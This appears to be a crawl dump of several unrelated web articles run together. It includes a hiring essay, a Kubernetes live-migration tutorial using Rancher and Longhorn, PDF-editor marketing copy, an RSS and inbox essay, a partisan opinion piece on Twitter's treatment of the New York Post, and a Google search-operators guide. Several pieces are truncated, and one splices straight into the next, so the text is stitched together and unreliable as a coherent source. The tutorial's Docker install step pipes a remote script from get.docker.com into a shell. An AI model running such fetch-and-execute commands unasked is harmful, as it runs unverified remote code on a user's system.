after about forty minutes or so. I could get it down with practice, but it doesn't matter-- I think slower than I type. That's a no hire. The point of the interview is to hire extremely talented engineers, not engineers as talented as me.</p><p>Second, algorithms questions are currently out of fashion, timing the candidate is downright blasphemous, and untimed work-specific questions are in vogue. Instead of asking the candidate to solve a programming problem like above, you're supposed to ask them to glue APIs together, and to take as long as they need. There are all sorts of very good arguments for why you should do this, all of which remind me of the following quote by Deirdre McCloskey in her essay <a href="https://www.deirdremccloskey.com/docs/graham/natural.pdf">The Natural</a> (which, by the way, is excellent and you should read):</p><blockquote><p>Richard Bower is an economist right down to his wing tip shoes. He knows Sophocles and Shakespeare alright, but he believes in economics. […] Give him any social situation, from insider trading to an obstreperous teenage child, and he looks to economics for an answer, or at least for a good running start.</p></blockquote><p>The economics answer is that people switched interview styles right in the middle of a tech boom when demand for software engineers dramatically exceeded supply, and then made up a bunch of reasons for why the new way of interviewing is better than the old way. FAANG companies hire entire engineering armies every year. No recruiting organization can sustain that without lowering the bar. But unlike managers at FAANG, your compensation doesn't depend on team size and you're not hiring bodies just to fill seats. When you need very talented people to join you, you must do the grueling, unscalable work to find and recruit them.</p><p>Third, system design and architecture questions are useful for candidates that think slower than they type. For exceptional people these types of questions are a waste of time. I've never met anyone able to write a complex program as fast as they can type but unable to figure out that they need a load balancer, or how to set one up on AWS.</p><h4>Judgement</h4><p>Judgement tends to be weakly correlated with talent, and comes down to this: there is a difference between a tinkerer and an engineer. They're close, but they aren't the same thing. Tinkering is building a Rube Goldberg machine for the sheer delight of building it. Engineering is discovering and satisfying (often unintuitive) constraints. The tinkerer works for the machine. The engineer makes the machine work for him.</p><p>Most engineers aren't tinkerers, they're in it for the money. Don't hire those because they have no soul and hanging around them will slowly poison your own soul by osmosis. Conversely, many tinkerers aren't engineers. Don't hire those either, because they'll build beautifully complex structures that serve no purpose other than their own existence. You want people who take great delight in building Rude Goldberg machines, but balance it with a broader sense of what they're trying to accomplish.</p><p>Another way of thinking about it is that talent is a combination of general aptitude and programming tactics. Judgement is programming strategy.</p><p>You don't need every engineer on your team to be Sun Tzu, but you do need them to have one of two qualities. Either the candidate should have good strategic intuition, or, at a minimum, they must be aware that strategy exists and be willing to acquiescence to someone with better judgement. The worst case scenario is a candidate with awful strategic intuition, but who thinks he's good. They'll end up wasting everyone's time in pointless discussions, and eventually will get disgruntled and quit.</p><p>How do you test for judgement? One school of thought is to ask the candidate a revealing set of questions. This is the "what are your weaknesses" question, version 2.0. Industry …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>One of the many benefits of Kubernetes that I often hear people talk about is <b>portability</b>. Kubernetes makes it possible to migrate workloads from a cluster to another easily, and this can be useful if for example a company wants to change infrastructure provider due to cost or any other reason.<false></false></p>
<p>While there are various ways one can migrate workloads from a cluster to another, how to do it actually depends on where and how the clusters are provisioned (e.g. if with the same provider or not). In most cases the easiest option is to back everything up on the old cluster, and restore in the new cluster before making the switch. This implies a certain amount of downtime depending on the apps and data to migrate. I have done this several times using <a href="https://velero.io/" target="_blank">Velero</a>﻿, a free, popular backup tool for Kubernetes. Migrating with zero downtime is certainly a more complex task.</p>
<p>I was bored so I did a fun experiment doing a <b>live</b>&nbsp;migration (as opposed to backup followed by a restore) of a cluster from <a href="https://www.hetzner.com/cloud" target="_blank">Hetzner Cloud</a>﻿ to <a href="https://www.digitalocean.com/" target="_blank">DigitalOcean</a>﻿, but where your nodes are actually hosted doesn't really matter if you do the migration the way I did.&nbsp;</p>
<p>To design a cluster in such a way that it would be possible to migrate it live to some other infrastructure even totally different, you need to take into account some limitations.&nbsp;In particular, your cluster cannot use features that are specific to cloud providers such as load balancers and block storage; also, you cannot use private networks because of course nodes in two different environments would not be able to communicate each other - unless you set up some kind of VPN or similar.</p>
<p>What I used for this test instead is my favorite Kubernetes tool:&nbsp;<a href="https://rancher.com/" target="_blank">Rancher</a>﻿. If you've happened to read this blog before you probably know that I absolutely love Rancher. It makes deploying and managing Kubernetes a lot easier, especially for a team of one like me.</p>
<p>In a previous post I wrote on <a href="https://vitobotta.com/2020/03/20/haproxy-kubernetes-hetzner-cloud/">how to set up a highly available load balancer with haproxy and keepalived</a>﻿ (see also the article I wrote for the Hetzner Community on <a href="https://community.hetzner.com/tutorials/howto-highly-available-load-balancer-hetzner-cloud-ansible" target="_blank">how to automate the same thing with Ansible</a>﻿), so I set up load balancers this way. For the sake of simplicity, I will skip that part in this post and just use a regular ingress connecting directly to a node.</p>
<p>For the storage instead, I used another project by Rancher, <a href="https://longhorn.io/" target="_blank">Longhorn</a>﻿. Longhorn is awesome in that it offers many features like a great dashboard, backups to S3/NFS and DR, and is open source and totally free. Longhorn also makes it incredibly easy to move volume replicas between nodes so it's a great fit for this experiment.</p>

<h2>Prerequisites</h2>
<p>For this post, I assume you </p>
<ul>
<li>are already familiar with Kubernetes, so if you are looking for an introduction to it this isn't the right post :)&nbsp;</li>
<li>are already familiar with Rancher. If not, you can anyway set it up easily by following <a href="https://rancher.com/docs/rancher/v2.x/en/installation/" target="_blank">the official documentation</a>﻿. After that it's a very intuitive graphical UI</li>
<li>have an account with a couple of cloud providers or anyway access to two different infrastructures where you can create some instances. Which providers you use doesn't really matter.</li>
</ul>

<h2>Creating the first cluster in Hetzner Cloud</h2>
<p>To get started, head to the Hetzner Cloud console (you can use the CLI&nbsp;if you prefer) and create three servers so we can test with a HA cluster. I called my nodes <i>hc-node1..3.&nbsp;</i>﻿Choose Ubuntu 18.04 or another OS&nbsp;supported by Rancher, and ensure that the servers have 2-3 cores and 2-4 GB&nbsp;of ram each.<i></i><false></false></p>
<p>Once the servers are up and running, SSH into them and update system packages, configure firewall etc if you wish (you may not need this if you are just testing this migration).</p>
<p>We have only two requirements concerning the software installed in the nodes. The first is Docker, which you can install with the following command:</p>
<pre><code>﻿curl -fsSL https://get.docker.com | sh</code></pre>
<p>The second requirement is open-iscsi, which is required by Longhorn:</p>
<pre><code>apt install open-iscsi -y</code></pre>
<p>We can now proceed with provisioning Kubernetes with Rancher. From the "Global"&nbsp;view, click "Add Cluster" and select the custom nodes option:</p>
<div><div><figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcXNPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--bb675cee8474aac635e568d74213a00f520aa5bf/rancher-new-cluster-custom-nodes.jpg" data-image="839"></figure></div></div>
<p>Give the cluster a name such as "test" and choose Weave as the network provider:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcXdPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--22baffc04eb9c00a6181716cd02d77a87f27cdaa/rancher-select-cni-plugin.jpg" data-image="840"></figure><p>You don't have to use Weave for this test, but in a real life scenario you should use a CNI&nbsp;plugin that enables encryption between the nodes since we are going to connect them to each other via the public Internet.</p>
<p>Click "Next", then select all the roles for the nodes and copy the provided Docker command:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcTBPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--11eee1104482af76e517c00c63b8427226214bd9/rancher-custom-nodes-docker-command.jpg" data-image="841"></figure><p>Then run that Docker command on each node. After a few seconds, the UI will report "3 new nodes have registered". Click "Done", then click on the name of the cluster from the list, then click on the "Nodes" tab to see the provisioning progress.&nbsp;</p>

<h2>Preparing the nodes in DigitalOcean</h2>
<p>The provisioning of Kubernetes will take several minutes, so in the meantime you can start preparing the nodes in DigitalOcean since the objective of this test is to migrate the cluster later.</p>
<p>So go ahead and create three droplets with at least 2 cores and Ubuntu 18.04 as the OS.</p>
<p>Install Docker and open-iscsi as explained earlier. The nodes are now ready.</p>

<h2>Installing Longhorn</h2>
<p>When Kubernetes provisioning is complete, the nodes will be marked as "Active" like in the picture below:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcTRPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--5f3f0374a7441ac02861e8776a018407de16e957/rancher-cluster-ready.jpg" data-image="842"></figure><p>Now from the top menu click on "test" (or whatever name you gave to the cluster), then "System", the click on the "Apps" tab.&nbsp;</p>
<p>Click on "Launch", search for Longhorn and click on it. Launch with the default settings, and wait - the installation will take a couple of minutes and you will see the progress bar. When green, Longhorn should be ready to provision storage. Double check by clicking on "Resources" &gt; "Workloads" and scrolling to the "longhorn-system"&nbsp;namespace. You will see the same resources as in the picture below:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcThPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--e9dd15be1b778d683a2c7153ed4ded121c1f2224/rancher-longhorn-installation-complete.jpg" data-image="843"></figure><p>Click again on the "Apps"&nbsp;tab and you'll notice a link to "/index.html" in the Longhorn card. Click on that link to securely access the Longhorn dashboard:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBckFPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--dc7a3ee776b0c06a000dc0bdc5f6474d96bbbb98/longhorn-dashboard.jpg" data-image="844"></figure><p>Now go to the "Node" tab and ensure that all the nodes are schedulable:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBckVPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--443e66387d27c4ecacb25af000d81fcfc21e3e96/longhorn-node-tab.jpg" data-image="845"></figure><p>By default, Longhorn will use the available storage on the nodes to provision persistent volumes, so you don't need to configure or install anything else.</p>
<p>Click on the "Volume"&nbsp;tab and keep it open so we can check later when volumes are created.</p>

<h2>Installing an example workload - Magento</h2>
<p>To test the migration, we'll deploy Magento as an example workload that uses two persistent volumes, one for Magento itself and the other for MariaDB.&nbsp;</p>
<p>So from the top menu go to "test" &gt; "Default" &gt; "Apps" and search for Magento. Click on the only result, configure username and password you'll use to access the app, and make sure persistent volumes are enabled both for Magento and MariaDB like in the picture:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcklPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--c5de92546ff514eb0771332f479204d232397ec4/rancher-magento-pvc-settings.jpg" data-image="846"></figure><p>You don't need to select a storage class since Longhorn's is set as default.</p>
<p>Set "Magento Host URL" to "magento.&lt;ip of a node&gt;.xip.io"&nbsp;so we don't have to configure some DNS somewhere. Any hostname for the xip.io domain that includes an IP address will resolve to that IP&nbsp;address, which is handy for tests.</p>
<p>Under "Hostname" click on "Specify a hostname to use"&nbsp;and enter the same hostname as for the previous step, then click "Launch".</p>
<p>Now go back to the "Volume"&nbsp;tab of the Longhorn UI and see that the volumes are created. It may take a little while for the Magento volume since the container image is a little large.</p>
<p>When the Magento and MariaDB&nbsp;pods are up and running open the hostname you configured earlier in the browser and ensure that the app works as expected.</p>

<h2>Migrating the cluster live</h2>
<p>So far we have a working Kubernetes cluster with a real life workload that uses persistent volumes, in Hetzner Cloud. Let's now migrate the cluster to DigitalOcean.</p>
<p>From the top menu in Rancher click on the project title, then click on "Edit Cluster". Scroll to the bottom, and you will see a familiar form:&nbsp;select all the roles for the new nodes, copy the Docker command and this time run that command on the <b>DigitalOcean nodes</b>﻿ that you prepared earlier.<b></b><false></false></p>
<p>Click on "Save" then on the "Nodes" tab and wait for the nodes to be "Active". It's gonna take several minutes and at the end you will have six active nodes:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBck1PIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--02f90cb73c6a3b354f98258e9f1798b61c0e6d76/all-nodes-active.jpg" data-image="847"></figure><p>We need to migrate both the persistent volumes and the workloads from the Hetzner Cloud nodes to the DigitalOcean nodes, so select the Hetzner Cloud nodes (hc-node1..3) and then click on "Cordon". Go to the Longhorn "Node" tab and verify that the Hetzner Cloud nodes are no longer schedulable for the storage.</p>
<p>Click on the "Volume"&nbsp;tab, then click on the first volume. You should see the current three replicas of the volume on the Hetzner Cloud volumes:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBclVPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--127d6b9c0950b58c2acda0b11f075167876e5aee/longhorn-volume-replicas.jpg" data-image="849"></figure><p>Click on the small drop down at the top right corner of the "Replicas" section and click on&nbsp;"Update Replicas Count". Set it to 6 and confirm. Longhorn will now create a new replica on each of the only schedulable nodes, which are the DigitalOcean ones. Wait until the new replicas are ready (blue background and "Running" status). Then set the replica count back to 3 and delete the replicas on the Hetzner Cloud nodes, so that only the replicas on the DigitalOcean nodes remain.</p>
<p>Ensure the status of the volume on the left is "Healthy", and repeat the same process with the second volume.</p>
<p>Once all the volume replicas have been migrated, ensure that Magento is still working. At this point we have the pods in Hetzner Cloud and the data in DigitalOcean. Magento should work exactly as before, just a little slower due to the higher latency.</p>
<p>Next, go to the "Nodes" tab in Rancher, select the Hetzner Cloud nodes and click on "Drain" with the options configured like in the picture to speed up the draining:</p>
<figure><img src="https://cdn.dynablogger.net/static/blobs/proxy/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBclFPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--7d3010d13a7c54daec89b0b5502dd25fe38692cd/rancher-drain-node.jpg" data-image="848"></figure><p>Wait until the Hetzner Cloud nodes are marked as "Drained", then check that the Magento and MariaDB pods have been rescheduled on the DigitalOcean nodes. If the pods don't get recreated because the volumes cannot be attached, schedule the deployments to 0 and back to 1. Sometimes it can take a little while to reattach the volumes. Check that Magento is still working.</p>
<p>Go to the "Apps" tab, click on the three dots in the Magento card and …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><h2>Add text to PDF like a business professional</h2><p>People judge books by their covers, and that is true for the digital world too. Your document format speaks volumes before the eyes ever glaze the title. In a business setting, If you’re not using PDF, you’re guilty of amateurism until proven otherwise. That’s why HR departments, Startup founders, freelancers, and rising talents add text to PDF to exchange serious communication.</p><h2>Write on PDF to stay organized and productive</h2><p>Typing on a PDF was always a troublesome task that would often end up with a call to the IT department. And that’s just awful. You’re losing both the time and mental bandwidth to do the actual work. Also, people in IT probably dislike your face if you’re nagging them to be your PDF editor.</p><p>‍<br>Choose a PDF document that needs extra words, and upload it to Good Annotations. Then, focus on your title, subtitle, text body, and callouts for important elements. Let the IT side and geeky tasks to us! </p><h2>Use red callouts to edit pdf for immediate attention</h2><p>The PDF editor comes with an array of tools that will help you add text to pdf. Once your file is online, choose the red text note, and draw attention in a mannered and robust way, without sounding unhinged with all caps or exclamation marks. Nobody likes to be screamed at through the screen. With the right callout, you can communicate in a robust and impactful way via your pdf documents. </p><h2>Add yellow callouts to PDFs for vibe and appreciation</h2><p>Bring out the right vibe with the right note. Nothing speaks,<em> I appreciate you</em>, better than an energetic yellow note under a well-done task. Your team members, employees, and employers all seek affirmation and appreciation. Tell them what’s good by adding a yellow callout to your PDF document.</p><h2>Add text to PDF with an entirely online PDF editor</h2><p>You don’t have to be boxed at your desk with your back bent and face inched away from the screen. Add text to pdf entirely online via Good Annotations from anywhere in the world, and any room, table, or street. Add text to pdf on trams, tubes, and tractors. Don’t drive and write on pdf, thought. That’s illegal. </p><h2>Write on PDF across all devices and gadgets</h2><p>If you can open Google, you can use Good Annotations, and if you can use Good Annotations, you can write on PDF from your device. Fire up any laptop, PC, tablet, smartphone, smart TV, or even a smart mirror and add text to your PDF.</p><h2>Fully free and beyond easy to use PDF editor </h2><p>Write on your pdf files for free. Entirely free, without ever having to leave a bank card, PayPal details, or provide your billing address. You can add text to PDF for free with effortless tools from the library.</p><p>We might charge for different features sometimes in the future, though. We’re working to bring you advanced tools for workflow, collaborative editing, and organized document libraries. Premium tools are mostly for bigger business users that require complicated tasks.

<p>Abraham Lincoln once said, "<a href="https://en.wikipedia.org/wiki/Marshall_McLuhan">The medium is the message</a>. And San Francisco summers are cold af."</p>
<p>Putting that aside, I've been thinking a lot (uh-oh) about why I like opening up my RSS reader app so much. And I'm not <em>just</em> talking about its looks, even though it's super cute (I'm using the free, open-source, and all-around neato <a href="https://ranchero.com/netnewswire/">NetNewsWire</a> for my RSS needs).</p>
<p>No, I'm talkin' about them RSS <em>feels</em>.</p>
<p>Why does using opening my RSS inbox feel so much better than typing in gmail.com or tapping the iMessages icon or, heavens forbid, opening up Twitter?</p>
<p>With my sweet-sweet RSS, there's no anxiety. There's no guilt. In our time-tracking Screen Time home screen widget era, there's almost a baccanalian decadance to sifting through an RSS inbox, like watching honey drip from one of those wooden combs in a cereal commercial. Or -- back when we were allowed -- going to the library and reading the newspaper from those weird wooden dowels.</p>
<p>It should go without saying that this feeling does not extend to the other inboxen in my life. And I'd like to understand why -- and see if I can do anything about it.</p>
<h2>A framework for messages</h2>
<p>Butchering some data pipeline terms, let's define an inbox (e.g. email, social media, text messages, RSS, phone calls) as a sink for messages from various data providers, where these messages wait for human-in-the-loop processing (in this case, you).</p>
<p>O! Ye of little time! How are you meant to evaluate the "importance" of a given message? Let's explore that across two vectors: (1) prior awareness of the message's sender and (2) usefulessness of the message contents.</p>
<p><span>

    </span></p>
<p>The sweet-spot is that upper row: useful messages from both "people we know" and "people we don't know." Whereas if you're in the bottom row, you're gonna have a bad time: useless messages are never... useful.</p>
<h4>Filtering on sender</h4>
<p>The bottom right quadrant is easy to visualize: robo-calls about your non-existent car's expired warranty, social media ads, junk mailers in your meatspace mailbox. </p>
<p>You might think, perhaps, that we can use the "Expected Sender" vs "Unexpected Sender" filter to avoid this quadrant. In fact, this is what Apple allows you to do with the new <a href="https://support.apple.com/en-us/HT207099#:~:text=To%20turn%20on%20Silence%20Unknown,in%20your%20recent%20calls%20list.">Silence Unknown Callers</a> feature in iOS 14 (which doesn't actually prevent the calls, but immediately sends unknown calls to the dead-letter queue that is your voicemailbox).</p>
<p>The problem with this blunt approach of dead-letter queueing the right column is that you're going to miss the serendipity of the upper right quadrant: calls from unexpected sources with useful information. Given <a href="https://www.charlieharrington.com/colon-cancer">my recent cancer diagnosis</a>, I've had tons of important, useful calls from unknown numbers every single day, from doctors and the like -- calls that I want to triage quickly. Sending all calls from unknown numbers straight to voicemail would just be yet another inbox to maintain. Worse, I might miss something important in the upper right quadrant.</p>
<p>A lighter touch approach here is to auto-classify your messages into buckets based on sender. Gmail now does this with their "Primary", "Social", and "Promotion" tabs. Everything's still "in your inbox", but now you can usually just "Select all" on that Promotion tab and safely send those messages straight to the netherworld.</p>
<p>The bottom left quadrant is where your unique lifeforce is slowly chipped away, doomscrolling through your high school classmates' life updates or, gasp, political views. Don't get me wrong -- I really enjoy Instagram and it makes me happy to see people I know doing cool, cute stuff. But I know it can get real bad in this quadrant real quick. Unfollowing and/or muting is key here.</p>
<h4>Filtering on content</h4>
<p>Okay, so, if filtering on sender alone doesn't work, can we use the message contents to figure out if a given message is going to be useful?</p>
<p>We're now talking about <em>pre-processing</em> the messages in our queues.</p>
<p>In the days of future past, you might have employed a staffer to "sort through your office mailbox" to do this. How very Don Draper of you. But in today's era of secure password managers and 2FA, we ideally don't have <em>that many</em> other people in our digital inboxes. The inbox providers are aware of this, and they're starting to provide some tools to help here -- as long as you're okay with them "reading" your messages.</p>
<p>Gmail, for example, has gotten pretty darn good at spam detection. They're "reading your emails" and dropping the bad ones into your "spam folder" dead-letter queue. Maybe, once in a blue moon, they false-positive something that you have to go spelunking into that elephant graveyard to find. But I'm never annoyed by this, because when I see absolute garbage that they've blocked for me day-in and day-out, I'm hashtag grateful again.</p>
<p>This approach, however, isn't possible with all mediums. There's no way to pre-filter on content for an incoming phone-call, for example.</p>
<p>And the tradeoff in pre-filtering on content is, of course, privacy. </p>
<p>If you're down for your inbox provider to "scan" your messages, then they can potentially start to do some smart stuff, like "bubbling up" useful messages or getting rid of bottom row crud.</p>
<p>But, more likely than not, they're also reading them for another purpose.</p>
<h4>The cost of free</h4>
<p>Many of these inbox platforms are free (e.g. social media, Gmail), and someone's gotta pay to keep that spam algorithm ticking. And that someone is you.</p>
<p>Most ads are squarely in the bottom right quadrant. "Good" ads -- I'm talking about those Instagram candles you keep converting on -- are upper right quadrant. The platforms do their darndest to make sure their ads are as upper-right as possible, but they can't guarantee that. YouTube keeps asking me my age because it's genuinely confused as to why my viewing habits fluctuate between watching someone clean old Apple II and VIC-20 computers and the latest Super Mario 3 speed-runs. </p>
<p>And, c'mon, I'd rather just not ever see ads in the first place.</p>
<p>Okay, tough guy. Are you willing to pay for an ad-free inbox then?</p>
<p>Maybe? Ugh. Yes, there's a bunch of new players in the space who are emphasizing privacy and going ad-free. But am I going to willingly add yet another recurring subscription to my life? The Mandalorian is about to come back, and I'm already bracing for the impending Disney+ subscription. </p>
<p>I'll come back to this, because our analysis is still missing two important features.</p>
<h2>A framework for inboxen</h2>
<p>So, far we've only explored the features of an individual message -- not the nature of an inbox itself.</p>
<p>Regardless of an individual message's usefuless or your prior awareness of its sender, an inbox has two other important features that contribute to our mental well-being: (1) typical message volume and (2) expected urgency of triage.</p>

  </a>
    </span></p>
<p>The message volume thing is straightforward. Some platforms have a never-ending feed of messages that you can "enjoy," others not so much.</p>
<p>At the same time, each inbox medium connotes a inherent sense of urgency. <strong>The medium is the madness</strong>, if you will. No matter what the message says or who sends it, there's a differentiated inbox-level "urgency punch" to your lizard brain whenever any single message (spam or not) comes flying in.</p>
<p>Let's be more specific with some typical inboxes in our lives:</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/f85539e1b1b5e52ca78c881a86f47601/f941f/inboxoverlay.png" target="_blank" rel="noopener">

  </a>
    </span></p>
<p>Phone calls are just about as "urgent" as it gets. Prior to iOS 14, phone calls used to interrupt whatever you were doing, taking up your iPhone's entire screen real estate. Doesn't get more urgent-y than that! Luckily, calls are relatively sparse compared to text messages, which you still need to respond to, but you can "put them on ice" for days at a time with a high-degree of cultural acceptance.</p>
<p>Social media messages are legion in terms of volume. And, while they're not especially urgent from an innate message-level perspective, the platforms do their darndest to "notify" you of "engagement opportunities" to keep you locked-in, so these inboxes fall in the semi-urgent category in my book.</p>
<p>Onto RSS -- my beautiful, dark, twisted RSS. There's truly zero urgency here and relatively few messages (writing blog posts is time-consuming!). Moreover, returning to our message evaluation framework, an RSS inbox only contains messages from known senders, since you've explicitly had to add their RSS feeds to your feed-roll. And, since you've likely done that because you expect to value the contents of their messages, you're likely living in the upper left quadrant in RSS-land, enjoying that drizzled honey and those weird-newspaper rolls.</p>
<p>Email is the real challenge-tunity here.</p>
<h3>Stuck in the Middle With You</h3>
<p>Email is caught in the middle of all these features, both message-level and inbox-level. Anyone can email you at any time with any message, so there's a ton of it, and any message may be useful and/or urgent. That's mostly a good thing, and probably our RFC-writing forerunners wanted it that way.</p>
<p>Thus, we check our email, prodigiously, every single day. All day long. While we're pooping, while we're Zooming, while we're doing any old thing.</p>
<p>Perhaps this is a lens on why newsletters are making a comeback. Email readers are a "captive audience," because we cannot avoid triaging our email inboxes. As long as publishers keep their newsletters top-row-level useful, we'll keep Substacking them. Certainly, the chances of me reading an email newsletter are greater than they would be if I had to visit individual blogs. However, I think my ideal for premium content would be paid RSS feeds, rather than email newsletters, because I want to keep my email inbox clean as possible to aid in my triaging. In fact, this is what many podcasts are now doing (since podcasts are just noisy RSS feeds).</p>
<p>OK, enough about content-monetization (have I mentioned I have a free newsletter below?). How can we make our email inbox <em>feel</em> better? Is it possible to make email feel as good as RSS?</p>
<p>First, we should establish principles-slash-goals for each quadrant in our Conjoined Box of …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><em>Disclaimer: I’m a registered voter with no party affiliation. I have a personal interest in tracking major news networks such as CNN, Fox News, Breitbart, the New York Times, and other outlets who publish misleading information since 2008. Twitter is a recent example of a large, influential medium that has now subjectively interfered with information flow to the public.</em></p>



<p>It has been over 10 days since the famous <a href="https://nypost.com/2020/10/14/hunter-biden-emails-show-leveraging-connections-with-dad-to-boost-burisma-pay/" target="_blank" rel="noreferrer noopener">New York Post story</a> discussing Hunter Biden’s activities with the Ukranian energy firm Burisma. Twitter reacted by locking the New York Post’s Twitter account from any activity, citing they were trying to prevent the spread of hacked information. Twitter CEO Jack Dorsey admits <a href="https://variety.com/2020/digital/news/twitter-ceo-nypost-block-wrong-hacked-materials-policy-1234807399/" target="_blank" rel="noreferrer noopener">blocking the story was a mistake</a> and ended up reallowing the sharing of the story on Twitter.</p>



<h3>Then one must ask, <em>why is the New York Post’s Twitter account still locked?</em></h3>



<p>If the decision was reversed, why isn’t the New York Post’s account unlocked? Why isn’t the New York Times account locked due to releasing Trump’s tax returns that were clearly stolen or “hacked”? Especially after the New York Times declined to share their evidence? Here’s a quote from the NYT article where they decline to share:</p>



<blockquote><p>“…Alan Garten, a lawyer for the Trump Organization, said that “most, if not all, of the facts appear to be inaccurate” and requested the documents on which they were based. After The Times declined to provide the records, in order to protect its sources…”</p><cite>https://www.nytimes.com/interactive/2020/09/27/us/donald-trump-taxes.html</cite></blockquote>



<p>So no records have been released “in order to protect sources”, which isn’t an explanation as to why the actual documents haven’t been published. You can publish tax returns without exposing your sources (for an example, look at <a href="https://wikileaks.org/" target="_blank" rel="noreferrer noopener">all of the WikiLeaks releases</a> over time). Ironically, by publishing the tax returns, you’ll force the hand of Trump to actually release his returns. Instead, all we have is the NYT claiming to have records that they won’t show and have obtained without permission.<strong> So why is the New York Post account locked and the NYT account not?</strong> </p>



<h3>A speculation</h3>



<p>Maybe the answer lies in Twitter’s rules and policies, which <a href="https://help.twitter.com/en/rules-and-policies/public-interest" target="_blank" rel="noreferrer noopener">give plenty of wiggle room</a> by utilizing “exceptions” that they alone determine is best for the public interest. Apparently unverified and unreleased tax returns are important for the public interest, but direct evidence of high-ranking US politician’s family member <a href="https://twitter.com/TrumpWarRoom/status/1196831901597806599?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1196831901597806599%7Ctwgr%5Eshare_3%2Ccontainerclick_1&amp;ref_url=https%3A%2F%2Fwww.breitbart.com%2Fpolitics%2F2019%2F11%2F19%2Fbackfire-vindman-admits-hunter-biden-seemed-unqualified-for-burisma-role%2F" target="_blank" rel="noreferrer noopener">receiving a highly paid position without prior credentials</a> is not of concern to the American public. </p>



<p>Maybe it turns out that Twitter is in fact biased? Considering it’s difficult, if not impossible for a human being to truly be entirely objective, Twitter’s review units are undoubtedly biased themselves since they’re made up of humans. Should there be insights into who makes up the committees that Twitter uses to review posts and their potential biases? Either way, the main question is; why are they subjectively trying to change the flow of information to the American public?</p>



<p>You’ll have to come to your own conclusion on that. </p>



<h3>To be transparent, this is my opinion.</h3>



<p>Any institution (private or public) with the power to influence outcomes of anything at scale, are incentivized to take a side. Since humans make up these institutions, they are inherently biased, no matter how hard they try to be unbiased. The resulting bias from the institution’s parts eventually come through as the bias of the whole institution. It’s inevitable and unavoidable, and this is what we’re seeing on Twitter’s decision to lock the New York Post’s account but not the New York Times.</p>



<p>The New York Post should be able to post their own articles without limitation unless other media outlets are restricted as well (such as BuzzFeed news). Unless every single news article is researched by a transparent committee with their justification on blocking/allowing it, one side will always benefit. </p>

        <section>
            <p>The ability to do precise Google searches and getting relevant results is a superpower that is easy to acquire  but most people don't have it. </p>

<p>The goal of this post is:</p>

<ul>
<li>to provide simple and tangible examples to help you gain this superpower </li>
<li>to show you how you can leverage Google for prospecting.</li>
</ul>

<h5 id="googlesearchoperators">Google Search Operators</h5>

<p>Google search operators (also known as “advanced operators”) are commands that extend the capabilities of regular text searches.  With Google search operators you can do anything from market analysis, prospecting people on LinkedIn, retrieving fundraising news, finding emails, etc. Understanding the basics of Google search operators will drastically improve the quality of your search results. </p>

<h5 id="howdogooglesearchoperatorswork">How do Google search operators work?</h5>

<p>Even though there are lots of search operators for you to use, they usually follow a similar syntax like this one:</p>

<p><img src="https://i.imgur.com/IuxJhKz.png" alt="<image>"></p>

<p><strong>Some of the most common search operators are:</strong></p>

<ul>
<li><code>site</code>: Limit results to those from a specific website</li>
<li><code>intitle</code>: Web pages with a certain keyword in the title</li>
<li><code>inurl</code>: Web pages with a certain keyword in the URL</li>
<li><code>filetype</code>: web pages with a certain file type, such as pdf or png</li>
<li><code>[number]..[number]</code>: restricts the search to a certain range of numbers</li>
</ul>

<h4 id="examplesforsalesgrowthandmarketingusecases">Examples for sales, growth, and marketing use cases:</h4>

<blockquote>
  <p><strong>Find: Google spreadsheets that include “startups” and “2020” in the title</strong></p>
</blockquote>

<ul>
<li><a href="https://www.google.com/search?q=site:docs.google.com/spreadsheets+intitle:startups+2020&amp;rlz=1CAZAQH_enPT910&amp;oq=site:docs.google.com/spreadsheets+intitle:startups+2020&amp;aqs=chrome.0.69i59j69i58.1251j0j1&amp;sourceid=chrome&amp;ie=UTF-8"><strong><code>site:docs.google.com/spreadsheets intitle:startups 2020</code></strong></a></li>
</ul>

<p>Use case: This search will provide you with several links to lists of Google spreadsheets with data about startups and the year 2020. For example, if you offer services for startups that are hiring remotely you’ve just found a list with 900+ potential leads.</p>

<blockquote>
